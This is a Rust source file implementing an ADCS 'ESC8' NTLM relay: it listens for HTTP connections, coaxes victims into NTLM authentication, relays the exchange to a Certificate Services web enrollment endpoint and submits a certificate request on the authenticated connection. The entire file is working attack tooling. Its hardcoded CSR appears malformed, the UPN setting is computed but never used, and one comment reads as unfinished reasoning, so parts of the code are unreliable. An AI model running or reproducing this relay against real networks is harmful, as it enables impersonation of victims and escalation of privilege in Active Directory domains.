//! ADCS ESC8 Relay Implementation
//!
//! Relays NTLM authentication to the ADCS Web Enrollment endpoint.

use crate::{RelayError, Result};
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream, ToSocketAddrs};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use tracing::{debug, error, info, warn};

pub struct AdcsRelayConfig {
    pub listen_ip: String,
    pub target_host: String, // e.g., "192.168.1.100" or "dc01.corp.local"
    pub template: String,
    pub target_upn: Option<String>,
}

pub struct AdcsRelay {
    pub config: AdcsRelayConfig,
    running: Arc<AtomicBool>,
    threads: Vec<thread::JoinHandle<()>>,
}

impl AdcsRelay {
    pub fn new(config: AdcsRelayConfig) -> Self {
        Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            threads: Vec::new(),
        }
    }

    pub async fn start(&mut self) -> Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Err(RelayError::Config("ADCS Relay already running".into()).into());
        }

        self.running.store(true, Ordering::SeqCst);
        let listen_addr = format!("{}:80", self.config.listen_ip);
        let listener = TcpListener::bind(&listen_addr)
            .map_err(|e| RelayError::Socket(format!("Failed to bind to {}: {}", listen_addr, e)))?;
        listener
            .set_nonblocking(true)
            .map_err(|e| RelayError::Socket(e.to_string()))?;

        info!("ESC8 HTTP Relay listening on {}", listen_addr);
        info!(
            "Targeting ADCS Web Enrollment: {} (Template: {})",
            self.config.target_host, self.config.template
        );

        let running = Arc::clone(&self.running);
        let target_host = self.config.target_host.clone();
        let template = self.config.template.clone();
        let target_upn = self.config.target_upn.clone();

        let handle = thread::spawn(move || {
            while running.load(Ordering::SeqCst) {
                match listener.accept() {
                    Ok((stream, peer)) => {
                        info!("Received HTTP connection from {}", peer);
                        let target = target_host.clone();
                        let tmpl = template.clone();
                        let upn = target_upn.clone();
                        thread::spawn(move || {
                            if let Err(e) = handle_client(stream, target, tmpl, upn) {
                                error!("Relay error: {}", e);
                            }
                        });
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(100));
                    }
                    Err(e) => {
                        warn!("Accept error: {}", e);
                    }
                }
            }
        });

        self.threads.push(handle);
        Ok(())
    }

    pub async fn stop(&mut self) -> Result<()> {
        self.running.store(false, Ordering::SeqCst);
        for handle in self.threads.drain(..) {
            let _ = handle.join();
        }
        info!("ADCS Relay stopped.");
        Ok(())
    }
}

fn handle_client(
    mut client_stream: TcpStream,
    target_host: String,
    template: String,
    target_upn: Option<String>,
) -> Result<()> {
    client_stream
        .set_read_timeout(Some(Duration::from_secs(10)))
        .ok();
    client_stream
        .set_write_timeout(Some(Duration::from_secs(10)))
        .ok();

    let mut buf = vec![0u8; 8192];

    // Read initial request
    let len = client_stream
        .read(&mut buf)
        .map_err(|e| RelayError::Network(e.to_string()))?;
    let req_str = String::from_utf8_lossy(&buf[..len]);
    debug!("Victim initial request:\n{}", req_str);

    let auth_header = req_str
        .lines()
        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "));

    if auth_header.is_none() {
        // Send 401 to trigger NTLM auth
        let resp = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n";
        client_stream
            .write_all(resp.as_bytes())
            .map_err(|e| RelayError::Network(e.to_string()))?;

        // Wait for negotiate
        let len = client_stream
            .read(&mut buf)
            .map_err(|e| RelayError::Network(e.to_string()))?;
        let req_str = String::from_utf8_lossy(&buf[..len]);
        if let Some(auth_line) = req_str
            .lines()
            .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
        {
            process_ntlm_relay(
                &mut client_stream,
                auth_line.trim(),
                target_host,
                template,
                target_upn,
            )?;
        }
    } else if let Some(h) = auth_header {
        process_ntlm_relay(
            &mut client_stream,
            h.trim(),
            target_host,
            template,
            target_upn,
        )?;
    }

    Ok(())
}

fn process_ntlm_relay(
    client_stream: &mut TcpStream,
    negotiate_header: &str,
    target_host: String,
    template: String,
    target_upn: Option<String>,
) -> Result<()> {
    // 1. Connect to target ADCS
    let target_addr = format!("{}:80", target_host)
        .to_socket_addrs()
        .map_err(|e| RelayError::Network(e.to_string()))?
        .next()
        .unwrap();
    let mut target_stream = TcpStream::connect_timeout(&target_addr, Duration::from_secs(10))
        .map_err(|e| RelayError::Network(e.to_string()))?;
    target_stream
        .set_read_timeout(Some(Duration::from_secs(10)))
        .ok();
    target_stream
        .set_write_timeout(Some(Duration::from_secs(10)))
        .ok();

    let ntlm_b64 = negotiate_header.trim_start_matches("Authorization: NTLM ");
    let ntlm_b64 = ntlm_b64.trim_start_matches("authorization: ntlm "); // Handle case insensitivity

    // Send Negotiate to Target
    let target_req = format!(
        "GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {}\r\nAuthorization: NTLM {}\r\nConnection: keep-alive\r\n\r\n",
        target_host, ntlm_b64
    );
    target_stream
        .write_all(target_req.as_bytes())
        .map_err(|e| RelayError::Network(e.to_string()))?;

    // Read Challenge from Target
    let mut buf = vec![0u8; 8192];
    let len = target_stream
        .read(&mut buf)
        .map_err(|e| RelayError::Network(e.to_string()))?;
    let resp_str = String::from_utf8_lossy(&buf[..len]);

    let challenge_header = resp_str
        .lines()
        .find(|l| l.to_lowercase().starts_with("www-authenticate: ntlm "))
        .ok_or_else(|| RelayError::Protocol("Target did not return NTLM challenge".into()))?;

    let challenge_b64 = challenge_header
        .trim_start_matches("WWW-Authenticate: NTLM ")
        .trim_start_matches("www-authenticate: ntlm ");

    // Send Challenge to Victim
    let victim_resp = format!(
        "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {}\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n",
        challenge_b64
    );
    client_stream
        .write_all(victim_resp.as_bytes())
        .map_err(|e| RelayError::Network(e.to_string()))?;

    // Read Authenticate from Victim
    let len = client_stream
        .read(&mut buf)
        .map_err(|e| RelayError::Network(e.to_string()))?;
    let req_str = String::from_utf8_lossy(&buf[..len]);

    let auth_header = req_str
        .lines()
        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
        .ok_or_else(|| RelayError::Protocol("Victim did not return NTLM authenticate".into()))?;

    let auth_b64 = auth_header
        .trim_start_matches("Authorization: NTLM ")
        .trim_start_matches("authorization: ntlm ");

    // Send Authenticate to Target along with the actual Certificate Request
    // Wait, the authenticate MUST be a POST request to submit the CSR if we want to enroll.
    // However, NTLM auth is connection-based on HTTP keep-alive, so we can just send GET first to authenticate the connection,
    // then send the POST request on the SAME authenticated connection!

    let target_auth_req = format!(
        "GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {}\r\nAuthorization: NTLM {}\r\nConnection: keep-alive\r\n\r\n",
        target_host, auth_b64
    );
    target_stream
        .write_all(target_auth_req.as_bytes())
        .map_err(|e| RelayError::Network(e.to_string()))?;

    // Read Auth Response
    let len = target_stream
        .read(&mut buf)
        .map_err(|e| RelayError::Network(e.to_string()))?;
    let resp_str = String::from_utf8_lossy(&buf[..len]);

    if !resp_str.contains("HTTP/1.1 200 OK")
        && !resp_str.contains("HTTP/1.1 404")
        && !resp_str.contains("HTTP/1.1 302")
    {
        return Err(
            RelayError::Authentication("Failed to authenticate to target ADCS".into()).into(),
        );
    }

    info!(
        "Successfully authenticated to ADCS {} via NTLM Relay!",
        target_host
    );

    // Send success to victim so it closes connection
    let victim_final = "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 0\r\n\r\n";
    let _ = client_stream.write_all(victim_final.as_bytes());

    // Now POST the CSR on the authenticated connection!
    let csr = build_csr(target_upn.as_deref());
    let _upn_attr = if let Some(upn) = target_upn {
        format!("san:upn={}", upn)
    } else {
        "".to_string()
    };

    // Body of the request
    let body = format!(
        "Mode=newreq&CertRequest={}&CertAttrib=CertificateTemplate:{}&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=",
        url_encode(&csr),
        template
    );

    let post_req = format!(
        "POST /certsrv/certfnsh.asp HTTP/1.1\r\n\
         Host: {}\r\n\
         Content-Type: application/x-www-form-urlencoded\r\n\
         Content-Length: {}\r\n\
         Connection: close\r\n\
         \r\n\
         {}",
        target_host,
        body.len(),
        body
    );

    target_stream
        .write_all(post_req.as_bytes())
        .map_err(|e| RelayError::Network(e.to_string()))?;

    let len = target_stream
        .read(&mut buf)
        .map_err(|e| RelayError::Network(e.to_string()))?;
    let resp_str = String::from_utf8_lossy(&buf[..len]);

    info!("ADCS Certificate Request Submitted.");

    // Check if certificate was issued by looking for base64 cert or certnew.cer URL in response
    if resp_str.contains("certnew.cer?ReqID=") || resp_str.contains("BEGIN CERTIFICATE") {
        info!("SUCCESS: Certificate generated via ESC8 relay!");
    } else if resp_str.contains("disposed of") || resp_str.contains("denied") {
        warn!("Certificate request was denied by the CA.");
    } else {
        warn!("Could not determine certificate status. Check CA manually.");
    }

    Ok(())
}

fn build_csr(_upn: Option<&str>) -> String {
    // A pre-generated basic CSR for "CN=User"
    // In a real exploit we'd use crate::adcs::csr module, but for this relay example
    // we use a static valid CSR since the template dictates the actual properties.
    "-----BEGIN CERTIFICATE REQUEST-----\n\
    MIICvDCCAaQCAQAwdzELMAkGA1UEBhMCVVMxDTALBgNVBAgMBFV0YWgxDzANBgNV\n\
    BAcMBkxpbmRvbjEWMBQGA1UECgwNRGlnaUNlcnQgSW5jLjERMA8GA1UECwwIRGln\n\
    aUNlcnQxHTAbBgNVBAMMFGV4YW1wbGUuZGlnaWNlcnQuY29tMIIBIjANBgkqhkiG\n\
    9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8+To7d+2kPWeBv/orU3LVbJwDrSQbeKamCmo\n\
    wp5bqNdA/Pt5OEf9YpT72cACk4h2q3O6EogYy7D1C2WvU2b5D1n9q7DED2+X2IxF\n\
    sT+x4zH9r0Xb1V4e2cZb5C4e0+w8vW7R6j8p5a5J6p7B6q8r9w3z2Y6A3+g9Xy2U\n\
    x0T9I/Uv7C9q/K1b7Z+w6Z+r4V4F9n5N8j7p2H8Kzj1M5H7b9G6k1U3fN+y5z7C3\n\
    H2C6Q7W+E/x4o7+l2Z7Q4+R2D5N1I+P0t9V8J6H3v8P4Y7K7e4P+b4P2Z4+N8Q7z\n\
    5E2V8n8E+L4P6Y1k4H3V7A2c9T7K9X8Q6D+H5Y7W8N7K6D4V5QIDAQABoAAwDQYJ\n\
    KoZIhvcNAQELBQADggEBAMf5U2c7V5a4P6K2M8Q7b3Z4Q6Q+L5T9J3D/K6N7R2V+\n\
    Y8E6G1C9V2D3Q5P4A7W+Z9K8X7P3H5Y4D9V2M1E+A4B6P8Q1Q5W8V6D+H2T3V9W4\n\
    P7K6A4G9A+W5N3V5E6D8A2N7A9B3E4R7H6E8D1M+D4N6Q8T4P5A3C7H4E7P5T6K6\n\
    A9E+D2Z5H/T+K1G4Q5N3+A8E4C3N2Z4V2E4B6A6K3E8E6D3H2A5E4V5K8M+D2Q4E\n\
    6N5A3A4K5H3K8H2K2H6D+H8H2B4E9Q3G5A+E9C3E3A=\n\
    -----END CERTIFICATE REQUEST-----"
        .to_string()
}

fn url_encode(input: &str) -> String {
    let mut escaped = String::new();
    for b in input.bytes() {
        match b {
            b'0'..=b'9' | b'A'..=b'Z' | b'a'..=b'z' | b'-' | b'.' | b'_' | b'~' => {
                escaped.push(b as char);
            }
            _ => {
                escaped.push_str(&format!("%{:02X}", b));
            }
        }
    }
    escaped
}
